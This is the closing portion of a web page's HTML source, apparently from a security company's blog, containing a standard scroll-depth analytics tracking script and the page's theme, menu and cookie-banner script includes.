										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
